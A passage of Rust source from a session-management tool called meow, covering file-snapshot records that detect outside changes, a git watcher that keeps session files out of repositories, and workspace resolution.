fn file_id(path: &Path, meta: &fs::Metadata) -> io::Result<FileId> {
    use std::os::windows::fs::OpenOptionsExt;
    use std::os::windows::io::AsRawHandle;
    use windows_sys::Win32::Storage::FileSystem::{
        GetFileInformationByHandle, BY_HANDLE_FILE_INFORMATION, FILE_FLAG_OPEN_REPARSE_POINT,
        FILE_SHARE_DELETE, FILE_SHARE_READ, FILE_SHARE_WRITE,
    };
    let unnumbered = |meta: &fs::Metadata| FileId {
        ino: 0,
        born: nanos(meta.created()),
        size: meta.len(),
        written: nanos(meta.modified()),
    };
    let opened = OpenOptions::new()
        .access_mode(0)
        .share_mode(FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE)
        .custom_flags(FILE_FLAG_OPEN_REPARSE_POINT)
        .open(path);
    let file = match opened {
        Ok(file) => file,
        Err(error) if error.kind() == io::ErrorKind::NotFound => return Err(error),
        Err(_) => {
            return Ok(FileId {
                ino: NO_NUMBER,
                ..unnumbered(meta)
            })
        }
    };
    // Size and times from the same open file as the number.
    let meta = file.metadata()?;
    if !meta.is_file() {
        return Err(io::Error::other("is not a regular file"));
    }
    let mut id = unnumbered(&meta);
    let mut info = BY_HANDLE_FILE_INFORMATION::default();
    // SAFETY: the handle is open until `file` is dropped, and `info` is a
    // valid place for what the call writes.
    let read = unsafe { GetFileInformationByHandle(file.as_raw_handle(), &mut info) } != 0;
    let index = (u64::from(info.nFileIndexHigh) << 32) | u64::from(info.nFileIndexLow);
    if read && index != 0 {
        id.ino = (u128::from(info.dwVolumeSerialNumber) << 64) | u128::from(index);
    }
    Ok(id)
}

#[cfg(not(any(unix, windows)))]
fn file_id(_path: &Path, meta: &fs::Metadata) -> io::Result<FileId> {
    Ok(FileId {
        ino: 0,
        born: nanos(meta.created()),
        size: meta.len(),
        written: nanos(meta.modified()),
    })
}

/// The read-back files of a session as they are. `odd` is set by anything
/// meow never leaves there (a link, a folder, a name it cannot record),
/// and, in a stored one, when files were replaced during the session.
/// `open`, in a stored one: written as a session started, and not yet
/// replaced by the record of its end.
#[derive(Debug, Clone, Default, PartialEq, Eq)]
struct Snapshot {
    files: std::collections::BTreeMap<String, FileId>,
    odd: bool,
    open: bool,
}

/// How a session's files are, against what meow last recorded of them
/// ([`Workspace::files_seen`]).
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum FilesSeen {
    /// As meow left them, or never recorded (an older meow made it).
    AsLeft,
    /// The last session did not end as meow ends one (killed, a crash, the
    /// power gone), so files it rewrites whole cannot be told from ones
    /// put in their place; none it only changes in place was replaced.
    Unclean,
    /// Replaced, rewritten or added outside meow.
    Changed,
}

impl Snapshot {
    fn of(dir: &Path) -> Self {
        let mut snapshot = Self::default();
        for name in READ_BACK {
            snapshot.note(name, &dir.join(name));
        }
        match fs::read_dir(dir.join("chats")) {
            Ok(entries) => {
                for entry in entries.take(MAX_TREE_ENTRIES) {
                    let Ok(entry) = entry else {
                        snapshot.odd = true;
                        continue;
                    };
                    match entry.file_name().to_str() {
                        Some(name) if !name.chars().any(char::is_control) => {
                            snapshot.note(&format!("chats/{name}"), &entry.path());
                        }
                        _ => snapshot.odd = true,
                    }
                }
            }
            Err(error) if error.kind() == io::ErrorKind::NotFound => {}
            Err(_) => snapshot.odd = true,
        }
        snapshot
    }

    fn note(&mut self, name: &str, path: &Path) {
        match fs::symlink_metadata(path) {
            // A read-only open of the database leaves an empty write-ahead
            // log behind (`meow list`); an empty one holds nothing.
            Ok(meta) if meta.is_file() && meta.len() == 0 && name == "state.db-wal" => {}
            Ok(meta) if meta.is_file() => match file_id(path, &meta) {
                Ok(id) => {
                    self.files.insert(name.to_owned(), id);
                }
                // Gone since it was looked at.
                Err(error) if error.kind() == io::ErrorKind::NotFound => {}
                Err(_) => self.odd = true,
            },
            Err(error) if error.kind() == io::ErrorKind::NotFound => {}
            _ => self.odd = true,
        }
    }

    /// Whether `now` has a file this one does not know as it is: replaced,
    /// rewritten or new. A file that is gone changes nothing.
    fn differs(&self, now: &Snapshot) -> bool {
        self.odd
            || now.odd
            || now
                .files
                .iter()
                .any(|(name, id)| !self.files.get(name).is_some_and(|seen| seen.unchanged(id)))
    }

    /// Whether a file that is only changed in place has another place on
    /// disk in `end` than in this one: something replaced it meanwhile.
    fn replaced_by(&self, end: &Snapshot) -> bool {
        end.odd
            || self
                .files
                .iter()
                .filter(|(name, _)| {
                    CHANGED_IN_PLACE.contains(&name.as_str()) || name.starts_with("chats/")
                })
                .any(|(name, id)| end.files.get(name).is_some_and(|now| !id.same_file(now)))
    }

    /// Whether `now` holds the files of this record moved to another place:
    /// each of the same size and last write. Moved to another disk, they
    /// are new files there, made at another time with other numbers.
    fn moved_to(&self, now: &Snapshot) -> bool {
        !self.odd
            && !self.open
            && !now.odd
            && now.files.iter().all(|(name, id)| {
                self.files
                    .get(name)
                    .is_some_and(|seen| seen.size == id.size && seen.written == id.written)
            })
    }

    /// How `now` stands against this record. After a session that did not
    /// end cleanly only a file put in place of one meow changes in place
    /// tells: the others it rewrites whole itself.
    fn seen(&self, now: &Snapshot) -> FilesSeen {
        if !self.open {
            if self.differs(now) {
                FilesSeen::Changed
            } else {
                FilesSeen::AsLeft
            }
        } else if self.odd || self.replaced_by(now) {
            FilesSeen::Changed
        } else {
            FilesSeen::Unclean
        }
    }

    fn to_text(&self) -> String {
        let state = match (self.open, self.odd) {
            (false, false) => "ok",
            (false, true) => "changed",
            (true, false) => "open",
            (true, true) => "open changed",
        };
        let mut text = format!("{SEEN_HEADER}\n{state}\n");
        for (name, id) in &self.files {
            text.push_str(&format!(
                "{} {} {} {} {name}\n",
                id.ino, id.born, id.size, id.written
            ));
        }
        text
    }

    /// `None` for anything meow did not write.
    fn from_text(text: &str) -> Option<Self> {
        let mut lines = text.lines();
        if lines.next()? != SEEN_HEADER {
            return None;
        }
        let (open, odd) = match lines.next()? {
            "ok" => (false, false),
            "changed" => (false, true),
            "open" => (true, false),
            "open changed" => (true, true),
            _ => return None,
        };
        let mut files = std::collections::BTreeMap::new();
        for line in lines {
            let mut parts = line.splitn(5, ' ');
            let mut number = || parts.next().and_then(|part| part.parse::<i128>().ok());
            let (ino, born, size, written) = (number()?, number()?, number()?, number()?);
            let id = FileId {
                ino: u128::try_from(ino).ok()?,
                born,
                size: u64::try_from(size).ok()?,
                written,
            };
            files.insert(parts.next()?.to_owned(), id);
        }
        Some(Self { files, odd, open })
    }
}

fn seen_path(home: &MeowHome, mark: &str) -> PathBuf {
    home.root().join(SEEN_DIR).join(mark)
}

/// How meow last left the files of the session `mark`. `None` when it
/// never recorded them (a session made by an older meow).
fn read_seen(home: &MeowHome, mark: &str) -> Option<Snapshot> {
    match read_seen_text(home, mark) {
        Ok(Some(text)) => Some(Snapshot::from_text(&text).unwrap_or(Snapshot {
            odd: true,
            ..Snapshot::default()
        })),
        Ok(None) => None,
        // Something else in its place: nothing can be trusted.
        Err(()) => Some(Snapshot {
            odd: true,
            ..Snapshot::default()
        }),
    }
}

/// The record of the session `mark` as written: `Ok(None)` when there is
/// none, `Err` when something else is in its place.
fn read_seen_text(home: &MeowHome, mark: &str) -> Result<Option<String>, ()> {
    match read_bounded(&seen_path(home, mark), SEEN_MAX) {
        Ok(text) => Ok(Some(text)),
        Err(error) if error.kind() == io::ErrorKind::NotFound => Ok(None),
        Err(_) => Err(()),
    }
}

fn write_seen(home: &MeowHome, mark: &str, snapshot: &Snapshot) -> Result<()> {
    create_private_dir(home.root())?;
    create_private_dir(&home.root().join(SEEN_DIR))?;
    write_private_atomic(&seen_path(home, mark), snapshot.to_text().as_bytes())
}

/// The git work tree `folder` is in, as its top folder and its `.git`,
/// when that `.git` is a folder of this user's alone. `None` for a `.git`
/// that is a link or a file (a linked work tree, a submodule).
fn own_git(folder: &Path) -> Option<(PathBuf, PathBuf)> {
    let folder = fs::canonicalize(folder).ok()?;
    for top in folder.ancestors() {
        let git = top.join(".git");
        match fs::symlink_metadata(&git) {
            Ok(meta) if meta.is_dir() => {
                #[cfg(unix)]
                if verify_unix_owner_meta(&meta, &git).is_err()
                    || crate::perms::others_can_change(&git, &meta)
                {
                    return None;
                }
                return Some((top.to_path_buf(), git));
            }
            Ok(_) => return None,
            Err(_) => continue,
        }
    }
    None
}

/// Lists `./meow` in `.git/info/exclude` of the git work tree it is in.
/// That covers a `./meow` whose `.gitignore` is gone, but a `.gitignore`
/// in the work tree overrides it (`!/meow/` at the top): what keeps
/// session files out is the `.gitignore` in `./meow` and in each session,
/// which [`GitWatch`] puts back while a session runs. Best effort.
fn exclude_from_git(sessions: &Path) {
    let Some(folder) = sessions
        .parent()
        .and_then(|folder| fs::canonicalize(folder).ok())
    else {
        return;
    };
    let Some((top, git)) = own_git(&folder) else {
        return;
    };
    if let Some(pattern) = folder.strip_prefix(&top).ok().and_then(exclude_pattern) {
        let _ = add_exclude(&git.join("info"), &pattern);
    }
}

/// The `.git/info/exclude` line for `./meow` of the folder `below` the top
/// of the work tree: `/meow/`, `/sub/dir/meow/`. `None` for a path a
/// pattern cannot say as one line.
fn exclude_pattern(below: &Path) -> Option<String> {
    let mut pattern = String::from("/");
    for part in below.components() {
        let std::path::Component::Normal(part) = part else {
            return None;
        };
        let part = part.to_str()?;
        if part.chars().any(char::is_control) {
            return None;
        }
        for ch in part.chars() {
            if matches!(ch, '*' | '?' | '[' | ']' | '\\') {
                pattern.push('\\');
            }
            pattern.push(ch);
        }
        pattern.push('/');
    }
    pattern.push_str(SESSIONS_DIR);
    pattern.push('/');
    Some(pattern)
}

/// Adds `pattern` to `exclude` in the folder `info` (made private if
/// missing), once. Never through a link, and only to a file of the user's
/// own with one link.
fn add_exclude(info: &Path, pattern: &str) -> Result<()> {
    if fs::symlink_metadata(info).is_err() {
        create_private_dir(info)?;
    }
    refuse_symlink(info)?;
    let path = info.join("exclude");
    let mut file = private_open_options()
        .read(true)
        .append(true)
        .create(true)
        .open(&path)
        .with_context(|| format!("cannot open {}", path.display()))?;
    let meta = file.metadata()?;
    if !meta.is_file() {
        bail!("{} is not a regular file", path.display());
    }
    #[cfg(unix)]
    {
        use std::os::unix::fs::MetadataExt;
        verify_unix_owner_meta(&meta, &path)?;
        if meta.nlink() > 1 {
            bail!("{} has a second hard link", path.display());
        }
    }
    let mut text = String::new();
    (&file).take(SEEN_MAX).read_to_string(&mut text)?;
    if text.lines().any(|line| line.trim_end() == pattern) {
        return Ok(());
    }
    let gap = if text.is_empty() || text.ends_with('\n') {
        ""
    } else {
        "\n"
    };
    file.write_all(format!("{gap}# meow session data\n{pattern}\n").as_bytes())?;
    Ok(())
}

/// Most session files a warning names.
const GIT_NAMES_SHOWN: usize = 3;

/// How long one [`GitWatch::check`] waits for git. Past it, git is killed
/// with what it started, and git is not asked again until its index
/// changes.
pub const GIT_CHECK_LIMIT: Duration = Duration::from_secs(3);

/// The repository [`GitWatch`] asks git about: the work tree [`own_git`]
/// found and its `.git`, and the folder that holds `./meow` as a path from
/// the top, `/` between names (empty at the top).
#[derive(Debug, Clone)]
struct WatchedRepo {
    top: PathBuf,
    git: PathBuf,
    below: String,
}

impl WatchedRepo {
    /// `None` outside a repository of the user's own, and for a folder
    /// whose path git could not be given as text.
    fn of(folder: &Path) -> Option<Self> {
        let (top, git) = own_git(folder)?;
        let canonical = fs::canonicalize(folder).ok()?;
        let mut parts = Vec::new();
        for part in canonical.strip_prefix(&top).ok()?.components() {
            let std::path::Component::Normal(part) = part else {
                return None;
            };
            let part = part.to_str()?;
            if part.chars().any(char::is_control) {
                return None;
            }
            parts.push(part.to_owned());
        }
        Some(Self {
            top,
            git,
            below: parts.join("/"),
        })
    }
}

/// Keeps git out of a session in `./meow` while it runs: a pull can
/// replace the `.gitignore` files that keep session files out (that of
/// `./meow` and the session's own), or make git track session files, at
/// any time. Each [`GitWatch::check`] puts back what was changed and says
/// what git would take in.
///
/// The repository is not meow's: git is run on the one [`own_git`] vetted
/// only, reaches no remote, and is given [`GIT_CHECK_LIMIT`] (see
/// [`crate::update::git_output_pinned`]).
#[derive(Default)]
pub struct GitWatch {
    /// Where git runs, closed as the session ends; none for a check made
    /// while meow waits in the terminal ([`GitRuns::Foreground`]).
    git: Option<crate::procs::Tracker>,
    /// The repository, once looked up.
    repo: Option<Option<WatchedRepo>>,
    /// The git index as last seen: git is asked again when it changes.
    index: Option<Option<(u64, i128)>>,
    /// What git was last found to track and to let in, said once.
    said: (Listed, Listed),
    /// That git did not answer in time, said once.
    said_late: bool,
    /// See [`GitWatch::files_doubtful`].
    doubtful: bool,
}

impl GitWatch {
    /// A watch whose git runs in `git`: a session closes it as it ends.
    pub fn using(git: crate::procs::Tracker) -> Self {
        Self {
            git: Some(git),
            ..Self::default()
        }
    }

    /// Whether something outside meow may have put files in the session
    /// since this watch began: git tracks files of the session that meow
    /// reads back (a pull replaces them), a `.gitignore` of meow's had to
    /// be put back, or git did not answer after its index changed.
    pub fn files_doubtful(&self) -> bool {
        self.doubtful
    }

    /// What to tell the user about the session in `dir`, one line each.
    pub fn check(&mut self, dir: &Path) -> Vec<String> {
        let mut notes = Vec::new();
        let (Some(sessions), Some(name)) = (
            folder_session(dir).and_then(Path::parent),
            dir.file_name().map(|name| name.to_string_lossy()),
        ) else {
            return notes;
        };
        let Some(folder) = sessions.parent() else {
            return notes;
        };
        let mut changed = false;
        for (marker, shown) in [
            (
                sessions.join(SESSIONS_MARKER),
                format!("{SESSIONS_DIR}/{SESSIONS_MARKER}"),
            ),
            (
                dir.join(SESSIONS_MARKER),
                format!("{SESSIONS_DIR}/{name}/{SESSIONS_MARKER}"),
            ),
        ] {
            if !is_sessions_marker(&marker) && write_marker(&marker).is_ok() {
                notes.push(format!("{shown} had been changed; meow put its own back"));
                changed = true;
                self.doubtful = true;
            }
        }
        let Some(repo) = self
            .repo
            .get_or_insert_with(|| WatchedRepo::of(folder))
            .clone()
        else {
            return notes;
        };
        let index = fs::metadata(repo.git.join("index"))
            .ok()
            .map(|meta| (meta.len(), nanos(meta.modified())));
        if !changed && self.index == Some(index) {
            return notes;
        }
        // Not the first look: git's index changed since, as a pull
        // changes it.
        let again = self.index.is_some();
        self.index = Some(index);
        let until = Instant::now() + GIT_CHECK_LIMIT;
        let runs = match &self.git {
            Some(tracker) => GitRuns::Tracked(tracker),
            None => GitRuns::Foreground,
        };
        let cached = git_lists(&repo, &name, &["--cached"], until, runs);
        match &cached {
            Ok(listed) if listed.read_back => self.doubtful = true,
            // A git that ran but gave no answer may hide a pull: taken as
            // one. A git meow cannot start, as none.
            Err(NoAnswer::Failed | NoAnswer::TimedOut) if again => self.doubtful = true,
            _ => {}
        }
        let others = match cached {
            Ok(_) => git_lists(
                &repo,
                &name,
                &["--others", "--exclude-standard"],
                until,
                runs,
            ),
            Err(no) => Err(no),
        };
        let late = [&cached, &others]
            .iter()
            .any(|listed| matches!(listed, Err(NoAnswer::TimedOut)));
        if late && !self.said_late {
            self.said_late = true;
            notes.push(format!(
                "git did not answer in {} s: session files not checked",
                GIT_CHECK_LIMIT.as_secs()
            ));
        }
        let place = crate::evidence::sanitize(&folder.display().to_string(), 300);
        if let Ok(cached) = cached {
            if cached.count > 0 && cached != self.said.0 {
                notes.push(format!(
                    "git tracks session files ({}): a commit would take them in. \
                     Run `git rm -r --cached {SESSIONS_DIR}` in {place}",
                    cached.shown()
                ));
            }
            self.said.0 = cached;
        }
        if let Ok(others) = others {
            if others.count > 0 && others != self.said.1 {
                notes.push(format!(
                    "git does not ignore session files ({}): a .gitignore in {place} lets them in",
                    others.shown()
                ));
            }
            self.said.1 = others;
        }
        notes
    }
}

/// The most of one name [`Listed::read`] keeps: past it, a name is cut.
const GIT_NAME_KEPT: usize = 64 * 1024;

/// What `git ls-files` listed of `./meow`: a few names, however long the
/// list is.
#[derive(Debug, Default, Clone, PartialEq, Eq)]
struct Listed {
    /// The first [`GIT_NAMES_SHOWN`] names, as paths from the folder that
    /// holds `./meow`.
    first: Vec<String>,
    /// How many names in all.
    count: usize,
    /// All of what git printed, hashed: whether a list is the one said
    /// before.
    digest: u64,
    /// Whether one is the session's own folder or a file in it that meow
    /// reads back ([`is_read_back`]).
    read_back: bool,
}

impl Listed {
    /// What `git ls-files -z` printed in `out`. `above`: the folder that
    /// holds `./meow` as a path from the top, with a `/` after it (or
    /// empty). `session`: the session's name.
    fn read(out: &mut dyn Read, above: &str, session: &str) -> io::Result<Self> {
        use std::hash::Hasher;
        let mut listed = Self::default();
        let mut digest = std::hash::DefaultHasher::new();
        let mut name = Vec::new();
        let mut chunk = vec![0; 64 * 1024];
        loop {
            let read = match out.read(&mut chunk) {
                Ok(0) => break,
                Ok(read) => read,
                Err(error) if error.kind() == io::ErrorKind::Interrupted => continue,
                Err(error) => return Err(error),
            };
            digest.write(&chunk[..read]);
            for &byte in &chunk[..read] {
                if byte == 0 {
                    listed.add(&name, above, session);
                    name.clear();
                } else if name.len() < GIT_NAME_KEPT {
                    name.push(byte);
                }
            }
        }
        listed.add(&name, above, session);
        listed.digest = digest.finish();
        Ok(listed)
    }

    fn add(&mut self, name: &[u8], above: &str, session: &str) {
        if name.is_empty() {
            return;
        }
        self.count += 1;
        // git tells case apart in `above` no more than in `./meow`.
        let name = match name.split_at_checked(above.len()) {
            Some((head, rest)) if head.eq_ignore_ascii_case(above.as_bytes()) => rest,
            _ => name,
        };
        let name = String::from_utf8_lossy(name);
        self.read_back |= is_read_back(&name, session);
        if self.first.len() < GIT_NAMES_SHOWN {
            self.first.push(name.into_owned());
        }
    }

    /// The first names, for a warning.
    fn shown(&self) -> String {
        let mut text = self
            .first
            .iter()
            .map(|name| crate::evidence::sanitize(name, 200))
            .collect::<Vec<_>>()
            .join(", ");
        if self.count > self.first.len() {
            text.push_str(&format!(" and {} more", self.count - self.first.len()));
        }
        text
    }
}

/// Whether `name`, a path from the folder that holds `./meow`, is the
/// folder of the session `session` or a file in it that meow reads back
/// ([`READ_BACK`], chats), with letters of either case alike: on macOS and
/// Windows, a pull that brings `MEOW/Acme/zsh_history` replaces
/// `meow/acme/zsh_history`.
fn is_read_back(name: &str, session: &str) -> bool {
    let mut parts = name.split('/');
    let is =
        |part: Option<&str>, what: &str| part.is_some_and(|part| part.eq_ignore_ascii_case(what));
    if !is(parts.next(), SESSIONS_DIR) || !is(parts.next(), session) {
        return false;
    }
    match parts.next() {
        None => true,
        Some(file) => {
            file.eq_ignore_ascii_case("chats")
                || READ_BACK.iter().any(|kept| file.eq_ignore_ascii_case(kept))
        }
    }
}

/// What `git ls-files <args>` lists of `./meow` in `repo`, by `until`, for
/// the session `session`.
fn git_lists(
    repo: &WatchedRepo,
    session: &str,
    args: &[&str],
    until: Instant,
    runs: GitRuns<'_>,
) -> Result<Listed, NoAnswer> {
    let above = if repo.below.is_empty() {
        String::new()
    } else {
        format!("{}/", repo.below)
    };
    // A folder name is a name, not a pattern, and in either case (see
    // `is_read_back`).
    let sessions = format!(":(literal,icase){above}{SESSIONS_DIR}");
    let mut command = vec!["ls-files", "-z"];
    command.extend_from_slice(args);
    command.extend(["--", sessions.as_str()]);
    let session = session.to_owned();
    crate::update::git_output_pinned(&repo.top, &command, until, runs, move |out| {
        Listed::read(out, &above, &session)
    })
}

impl Workspace {
    /// The mark of a session outside `~/.meow`, when it has a valid one.
    fn mark(&self) -> Option<&str> {
        self.profile.id.as_deref().filter(|id| is_valid_mark(id))
    }

    /// Whether files meow reads back from this session were replaced,
    /// rewritten or added since meow last left it: by a `git pull` or `git
    /// checkout` in the folder that holds it, an unpacked archive, or by
    /// hand. False for a session meow never left with this check. Asked
    /// while no session runs in it: a session that runs records its files
    /// as open ([`FilesSeen::Unclean`]).
    pub fn files_changed(&self, home: &MeowHome) -> bool {
        self.files_seen(home) == FilesSeen::Changed
    }

    /// [`Workspace::files_changed`], and whether the last session ended
    /// as meow ends one.
    pub fn files_seen(&self, home: &MeowHome) -> FilesSeen {
        self.mark()
            .and_then(|mark| read_seen(home, mark))
            .map_or(FilesSeen::AsLeft, |seen| {
                seen.seen(&Snapshot::of(&self.dir))
            })
    }

    /// The folder this session was moved from: the user's own record
    /// places its mark in a folder that is gone, and its files are as meow
    /// left them there, each of the same size and last write (moved to
    /// another disk, they are new files there). `None` for anything else
    /// (a copy, a folder that came with a clone, files changed since).
    pub fn moved_from(&self, home: &MeowHome) -> Option<PathBuf> {
        let mark = self.mark()?;
        folder_session(&self.dir)?;
        let old = read_record(home).into_iter().rev().find_map(|entry| {
            let dir = entry.dir.filter(|_| entry.mark == mark)?;
            matches!(fs::symlink_metadata(&dir), Err(error) if error.kind() == io::ErrorKind::NotFound)
                .then_some(dir)
        })?;
        read_seen(home, mark)?
            .moved_to(&Snapshot::of(&self.dir))
            .then_some(old)
    }

    /// Takes in the session [`Workspace::moved_from`] found in `old`: the
    /// record places its mark here now, and what meow knew of its files
    /// holds for them here. Its shell history (fish's too) and last folder
    /// stay.
    pub fn take_moved(&self, home: &MeowHome, old: &Path) -> Result<()> {
        self.check_name_free(home)?;
        let mark = self
            .mark()
            .map(str::to_owned)
            .context("the session has no mark")?;
        self.secure()?;
        remember(home, &mark, Some(&self.dir))?;
        crate::shims::move_fish_history(old, &self.dir);
        write_seen(home, &mark, &Snapshot::of(&self.dir))
    }

    /// Drops what a file put in the session could abuse: the shell
    /// histories (a command one up-arrow away) and `last_cwd`.
    pub fn drop_carried_files(&self) {
        let _ = fs::remove_file(self.last_cwd_path());
        for shell in HISTORY_SHELLS {
            let _ = fs::remove_file(self.history_path(shell));
        }
    }
}

/// Records how meow leaves the files of a session it used, in `~/.meow`,
/// so that opening it next time tells whether something else changed them
/// since ([`Workspace::files_changed`]). A session, or a helper that
/// writes them alone, records them as open when it starts, and as they are
/// when it ends (when this is dropped): a record left open tells that it
/// did not end cleanly.
#[derive(Debug)]
pub struct SessionFiles {
    home: MeowHome,
    dir: PathBuf,
    mark: Option<String>,
    /// For a helper: see [`SessionFiles::for_helper`].
    helper: bool,
    /// The files as the session found them, to tell whether one meow only
    /// changes in place was replaced while it ran.
    start: Option<Snapshot>,
    /// Files that may not be the user's (the session came with the folder,
    /// or they changed outside meow) count as meow's only once the session
    /// has started ([`SessionFiles::started`]).
    doubtful: bool,
    started: bool,
    /// See [`SessionFiles::changed_outside`].
    changed_outside: bool,
    /// For a helper that writes the files alone: the helper lock
    /// ([`Workspace::write_alone`]), let go once they are recorded.
    alone: Option<crate::lock::HelperLock>,
    /// For a helper that writes the files alone: whether the record was
    /// open before it began (an end that was not clean stays known).
    was_open: bool,
    /// For any other helper: the record as it was when it began.
    seen_before: Result<Option<String>, ()>,
}

impl SessionFiles {
    /// For the session this process holds the lock of, taken before
    /// anything of it is used: the record says the session is open from
    /// now on. Drop it once the shell and the coordinator have stopped and
    /// the database is closed. `doubtful`: see [`SessionFiles::started`].
    pub fn for_session(home: &MeowHome, workspace: &Workspace, doubtful: bool) -> Self {
        let mut files = Self::new(home, workspace, false);
        let start = Snapshot::of(&workspace.dir);
        files.doubtful = doubtful;
        files.started = false;
        files.write_open(&Snapshot {
            odd: doubtful,
            ..start.clone()
        });
        files.start = Some(start);
        files
    }

    /// For a helper command run on `workspace` without its session. One
    /// that writes the files alone (`alone`, from [`Workspace::write_alone`])
    /// records them as open until it is dropped, as a session does, so
    /// that one cut short (Ctrl-C, a closed terminal) is known as an end
    /// that was not clean; dropped, it records them before it lets go of
    /// the helper lock. Any other records them only if nobody else did
    /// since it began and no session or helper writes them now. Files that
    /// had changed outside meow before it ran are left so: only opening the
    /// session takes them in. A record left open stays open.
    pub fn for_helper(
        home: &MeowHome,
        workspace: &Workspace,
        alone: Option<crate::lock::HelperLock>,
    ) -> Self {
        let mut files = Self::new(home, workspace, true);
        if workspace.files_changed(home) {
            files.mark = None;
        }
        if let Some(mark) = &files.mark {
            files.seen_before = read_seen_text(home, mark);
            if alone.is_some() {
                let before = read_seen(home, mark);
                files.was_open = before.as_ref().is_some_and(|seen| seen.open);
                let mut now = Snapshot::of(&workspace.dir);
                now.odd |= before.is_some_and(|seen| seen.odd);
                files.write_open(&now);
            }
        }
        files.alone = alone;
        files
    }

    fn new(home: &MeowHome, workspace: &Workspace, helper: bool) -> Self {
        Self {
            home: home.clone(),
            dir: workspace.dir.clone(),
            mark: workspace.mark().map(str::to_owned),
            helper,
            start: None,
            doubtful: false,
            started: true,
            changed_outside: false,
            alone: None,
            was_open: false,
            seen_before: Ok(None),
        }
    }

    /// Says that the session has started: the user saw the warnings and
    /// answered about its queued scans, and its shell runs. Until then, a
    /// `doubtful` session that ends (a failed start, an error) is recorded
    /// as changed outside meow, so the next open warns again. The open
    /// record now holds the files as they are.
    pub fn started(&mut self) {
        self.started = true;
        let mut now = Snapshot::of(&self.dir);
        now.odd = self.changed_outside
            || self
                .start
                .as_ref()
                .is_some_and(|start| start.replaced_by(&now));
        self.write_open(&now);
    }

    /// Records `snapshot` as the files of a session that is open. Best
    /// effort: without it, an end that is not clean looks like a change.
    fn write_open(&self, snapshot: &Snapshot) {
        let Some(mark) = &self.mark else {
            return;
        };
        if self.dir.join(PROFILE_FILE).is_file() {
            let open = Snapshot {
                open: true,
                ..snapshot.clone()
            };
            let _ = write_seen(&self.home, mark, &open);
        }
    }

    /// Says that something outside meow may have put files in the session
    /// while it ran ([`GitWatch::files_doubtful`]): they are recorded as
    /// changed outside meow, so the next open warns and drops the shell
    /// history and last folder.
    pub fn changed_outside(&mut self) {
        self.changed_outside = true;
    }

    fn record(&self) -> Result<()> {
        let Some(mark) = &self.mark else {
            return Ok(());
        };
        if !self.dir.join(PROFILE_FILE).is_file() {
            return Ok(());
        }
        let mut now = Snapshot::of(&self.dir);
        if self.helper {
            if self.alone.is_none()
                && (crate::lock::SessionLock::is_held(&self.dir.join(LOCK_FILE))
                    || crate::lock::HelperLock::is_held(&self.dir.join(HELPER_LOCK_FILE))
                    || read_seen_text(&self.home, mark) != self.seen_before)
            {
                return Ok(());
            }
            // An end that was not clean stays known until a session ends.
            now.open = if self.alone.is_some() {
                self.was_open
            } else {
                read_seen(&self.home, mark).is_some_and(|seen| seen.open)
            };
        } else if self.changed_outside
            || (self.doubtful && !self.started)
            || self
                .start
                .as_ref()
                .is_some_and(|start| start.replaced_by(&now))
        {
            now.odd = true;
        }
        write_seen(&self.home, mark, &now)
    }
}

impl Drop for SessionFiles {
    fn drop(&mut self) {
        let _ = self.record();
        // The helper lock goes only now, with the files recorded.
        drop(self.alone.take());
    }
}

#[cfg(windows)]
fn is_local_absolute_dir_path(dir: &Path) -> bool {
    use std::path::{Component, Prefix};
    if !dir.is_absolute() {
        return false;
    }
    let mut comps = dir.components();
    matches!(
        (comps.next(), comps.next()),
        (Some(Component::Prefix(p)), Some(Component::RootDir))
            if matches!(p.kind(), Prefix::Disk(_) | Prefix::VerbatimDisk(_))
    )
}

#[cfg(not(windows))]
fn is_local_absolute_dir_path(dir: &Path) -> bool {
    dir.is_absolute() && !dir.to_string_lossy().starts_with(r"\\")
}

fn dir_name(dir: &Path) -> String {
    let raw = dir
        .file_name()
        .map(|name| name.to_string_lossy().into_owned())
        .unwrap_or_default();
    let sanitized = crate::evidence::sanitize(&raw, NAME_MAX);
    if sanitized.is_empty() {
        "local".to_owned()
    } else {
        sanitized
    }
}

/// The folder of the existing session `name`, wherever it is (see
/// [`find_session`]). Fails, creating nothing, when there is none.
fn existing_session_dir(home: &MeowHome, cwd: &Path, name: &str) -> Result<PathBuf> {
    let name = checked_name(name)?;
    match find_session(home, cwd, &name)? {
        Some(location) => location.dir(home, &name),
        None => bail!("no meow workspace named '{name}' (`meow list` shows them)"),
    }
}

/// Picks the workspace directory a helper subcommand targets. Explicit flags
/// win over the environment:
/// `--local`, `--session`, `$MEOW_WORKSPACE`, then `$MEOW_SESSION`.
pub fn resolve_helper_dir(
    home: &MeowHome,
    cwd: &Path,
    local: bool,
    session_flag: Option<&str>,
    env: &SessionEnv,
) -> Result<PathBuf> {
    if local {
        return local_session_dir(home, cwd, "--session <name>");
    }
    if let Some(name) = session_flag {
        return existing_session_dir(home, cwd, name);
    }
    if let Some(dir) = &env.workspace {
        let resolved = std::path::absolute(dir)
            .with_context(|| format!("cannot resolve ${WORKSPACE_ENV} ({})", dir.display()))?;
        let real = |p: &Path| fs::canonicalize(p).unwrap_or_else(|_| p.to_path_buf());
        let base = real(home.root());
        let target = real(&resolved);
        let inside_home = resolved == home.root()
            || resolved.starts_with(home.root())
            || target == base
            || target.starts_with(&base);
        if inside_home && !home.is_saved_workspace_dir(&resolved) {
            bail!(
                "${WORKSPACE_ENV} ({}) points into meow's own data directory rather than a workspace",
                resolved.display()
            );
        }
        return Ok(resolved);
    }
    if let Some(name) = &env.session {
        return existing_session_dir(home, cwd, name);
    }
    bail!(
        "No active meow session. Run this inside `meow <name>`, \
         or pass --session <name> or --local."
    )
}

// ---------------------------------------------------------------------------
// Listing
// ---------------------------------------------------------------------------

/// Whether a session is open on a listed workspace right now.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Default)]
pub enum SessionState {
    /// No session is open.
    #[default]
    Closed,
    /// A session is open in another terminal.
    Running,
    /// The listing was asked for from inside this workspace's session.
    Current,
    /// A `./.meow` that came with the folder: not this user's, not read.
    NotYours,
}

impl SessionState {
    fn label(self) -> &'static str {
        match self {
            SessionState::Closed => "-",
            SessionState::Running => "running",
            SessionState::Current => "this session",
            SessionState::NotYours => "not yours",
        }
    }
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct WorkspaceSummary {
    pub name: String,
    pub dir: PathBuf,
    pub local: bool,
    /// `Closed` as read from disk; the caller asks the sessions themselves.
    pub state: SessionState,
    /// `None` when `profile.toml` cannot be parsed.
    pub mode: Option<Mode>,
    /// Hosts in `graph.json`.
    pub hosts: usize,
